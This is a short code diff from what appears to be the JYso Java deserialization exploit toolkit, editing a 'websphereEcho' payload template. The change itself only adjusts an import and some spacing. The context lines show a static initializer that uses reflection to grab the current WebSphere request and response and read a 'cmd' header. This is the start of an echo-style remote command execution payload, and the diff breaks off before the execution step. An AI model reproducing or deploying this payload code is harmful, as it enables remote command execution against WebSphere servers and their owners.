@@ -2,13 +2,14 @@ package com.qi4l.JYso.template.echoStatic;
 
 import java.io.OutputStream;
 
-import static com.qi4l.JYso.gadgets.Jackson3.getFieldValue;
+import static com.qi4l.JYso.gadgets.utils.Reflections.getFieldValue;
+
 
 public class websphereEcho {
 
     static {
         try {
-            Class                   clazz = Thread.currentThread().getClass();
+            Class clazz = Thread.currentThread().getClass();
             java.lang.reflect.Field field = clazz.getDeclaredField("wsThreadLocals");
             field.setAccessible(true);
             Object obj = field.get(Thread.currentThread());
@@ -19,7 +20,7 @@ public class websphereEcho {
                 if (o == null) continue;
 
                 if (o.getClass().getName().endsWith("WebContainerRequestState")) {
-                    Object req  = o.getClass().getMethod("getCurrentThreadsIExtendedRequest", new Class[0]).invoke(o, new Object[0]);
+                    Object req = o.getClass().getMethod("getCurrentThreadsIExtendedRequest", new Class[0]).invoke(o, new Object[0]);
                     Object resp = o.getClass().getMethod("getCurrentThreadsIExtendedResponse", new Class[0]).invoke(o, new Object[0]);
 
                     String cmd = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
